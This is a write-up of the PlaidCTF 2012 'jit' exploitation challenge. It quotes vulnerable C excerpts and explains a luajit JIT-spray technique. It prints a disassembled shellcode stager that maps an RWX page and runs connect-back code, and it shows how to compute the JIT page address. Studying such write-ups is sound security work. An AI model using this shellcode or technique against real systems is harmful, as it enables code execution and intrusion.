---
title: jit source and writeup
authors:
  - ricky
layout: post
categories:
  - Pwn
ctf: PlaidCTF
year: 2012
---
This is the third of a series of posts where we’ll give our solutions (as well as source code) for some problems from Plaid CTF 2012.

## Source code

* [jit.c][1]
* [sandbox.lua][2] </ul>

## Overview

jit was a 64-bit C binary (PIE) running under xinetd on a Debian machine with NX and ASLR enabled. The machine that this was running on had /bin/sh chmodded 700 (otherwise, certain unfortunate 64-bit libc gadgets made this too easily solvable).

<!--more-->

The program basically reads in a lua script, closes stdin, then runs it inside a restricted lua environment with only selected functions available.

## Vulnerabilities

Since the main goal of this problem was to get people to place shellcode on the JIT page, the vulnerabilities were a little bit obvious and contrived. In addition to a restricted list of standard lua functions, two C functions frob and fry were added to the environment.

Here is an excerpt of the frob function:

```
buf = malloc(len);
...
strncpy(buf, arg, len);
memfrob(buf, len);
lua_pushstring(L, buf);
```

This can be used to leak some memory off of the heap.

The fry function calls a dofry function which looks like this:

```
// Only called it len &lt; 32
void dofry(lua_State *L, const char *s, size_t len) {
    char buf[8];

    strncpy(buf, s, len);
    buf[sizeof(buf)-1] = '\0';
    strfry(buf);
    lua_pushstring(L, buf);
}
```

which contains a pretty obvious stack buffer overflow (with just enough bytes to overwrite the return address).

## Exploitation

To exploit these vulnerabilities, we need to have our script place shellcode on the JIT page, find the address where this shellcode is located, then use the buffer overflow to set %rip to the address of the shellcode on the JIT page.

### Getting shellcode on the JIT page

Unfortunately, luajit does some optimizations which made it difficult to use standard arithmetic operators to get contants on the JIT page. However, after some experimentation, I found that bit.bxor could be used to get 4 byte constants on the JIT page. In order to make sure that the code got jitted, I placed the xors inside of a loop with 4096 iterations:

```
for i = 1, 4096 do
x = b + bit.bxor(x, 0x41414141)
x = b + bit.bxor(x, 0x42424242)
x = b + bit.bxor(x, 0x43434343)
...
end
```

This causes code like the following to show up on the JIT page:

```
fe63:   81 f2 41 41 41 41       xor    $0x41414141,%edx
fe69:   03 d1                   add    %ecx,%edx
fe6b:   81 f2 42 42 42 42       xor    $0x42424242,%edx
fe71:   03 d1                   add    %ecx,%edx
fe73:   81 f2 43 43 43 43       xor    $0x43434343,%edx
fe79:   03 d1                   add    %ecx,%edx
```
In order to get useful shellcode running with this, we need to jump over the `add %ecx,%edx` and the beginning of the xor instruction to end up in our constant again. To do this, we make each of constants something of the form 0x04ebXXXX. The `eb 04` jumps 4 bytes past the end of the jump instruction, which skips over the `add %ecx,%edx` and the beginning of the xor instruction, and lands us at the constant we used for the next xor instruction. This means that for each constant that we xor, we get 2 bytes in which to put instructions for our shellcode.

The shellcode that I ended up using looks something like this:

```
0:   6a 00                   pushq  $0x0
2:   6a 00                   pushq  $0x0
4:   5f                      pop    %rdi
5:   58                      pop    %rax
6:   b4 10                   mov    $0x10,%ah
8:   50                      push   %rax
9:   5e                      pop    %rsi
a:   6a 07                   pushq  $0x7
c:   5a                      pop    %rdx
d:   6a 22                   pushq  $0x22
f:   41 5a                   pop    %r10
11:   6a ff                   pushq  $0xffffffffffffffff
13:   41 58                   pop    %r8
15:   6a 00                   pushq  $0x0
17:   41 59                   pop    %r9
19:   6a 09                   pushq  $0x9
1b:   58                      pop    %rax
1c:   0f 05                   syscall # mmap(NULL, 4096, 7, 0x22, -1, 0)
1e:   50                      push   %rax
1f:   5f                      pop    %rdi
20:   59                      pop    %rcx # pop values off the stack until we get to the 2nd argument of dofry
21:   59                      pop    %rcx
22:   59                      pop    %rcx
23:   59                      pop    %rcx
24:   b3 20                   mov    $0x20,%bl
26:   00 d9                   add    %bl,%cl # add 32 to the 2nd argument of dofry (this is where we put our connect back shellcode)
28:   51                      push   %rcx
29:   5e                      pop    %rsi
2a:   6a 00                   pushq  $0x0
2c:   59                      pop    %rcx
2d:   b1 ff                   mov    $0xff,%cl
2f:   f3 a4                   rep movsb %ds:(%rsi),%es:(%rdi) # copy 255 bytes of the shellcode onto our RWX page
31:   ff e0                   jmpq   *%rax
```

Since every instruction is at most 2 bytes long, we can put them all on the JIT page using our 4 byte constants. This shellcode mmaps an RWX page, copies some code to it, then jumps to it. Keeping in mind that this will executed via the fry buffer overflow, the shellcode copies more shellcode from the 2nd argument to dofry, which is a string we control.

### Finding the JIT page

Using the memory disclosure in the frob function, we can leak a libc address. However, getting from that to a JIT page address requires a little bit of code reading.

In order to keep the jit page within relative jump range from the libluajit code, libluajit places JIT pages at a location relative to the location of libluajit. The code (in lj_mcode.c) looks something like this (hint is the address passed to mmap):

```
/* Get memory within relative jump distance of our code in 64 bit mode. */
static void *mcode_alloc(jit_State *J, size_t sz)
{
  ...
  uintptr_t target = (uintptr_t)(void *)lj_vm_exit_handler &#038; ~(uintptr_t)0xffff;
  ...
  const uintptr_t range = (1u &lt;&lt; LJ_TARGET_JUMPRANGE) - (1u &lt;&lt; 21);
  ...
    /* Next try probing pseudo-random addresses. */
    do {
      hint = (0x78fb ^ LJ_PRNG_BITS(J, 15)) &lt;&lt; 16;  /* 64K aligned. */
    } while (!(hint + sz &lt; range));
    hint = target + hint - (range>>1);
  ...
}
```

The call to `LJ_PRNG_BITS` looks a little scary, but it turns out the PRNG state is always initialized to 0, so it is fully predictable. It turns out that on our system, this loop terminates after 1 iteration (and `LJ_PRNG_BITS` returns 0), so we can calculate the location of the JIT page by:

```
jitpage_addr = target_addr + 0x78fb0000 - 0x3ff00000
```

where `target_addr` is `lj_vm_exit_handler & ~0xffff`. Since the distance between libc and libluajit is constant, we can use our libc address leak to determine exactly where the JIT page will be located.

### Putting it together

Now we have shellcode on the JIT page, and we can calculate where it is. We can also control %rip using the fry buffer overflow, so all we need to do is combine all of this into a lua program that performs the exploit. Here is our exploit for this problem: [exploit.lua][3].

 [1]: http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/jit.c
 [2]: http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/sandbox.lua_.txt
 [3]: http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/exploit.lua_.txt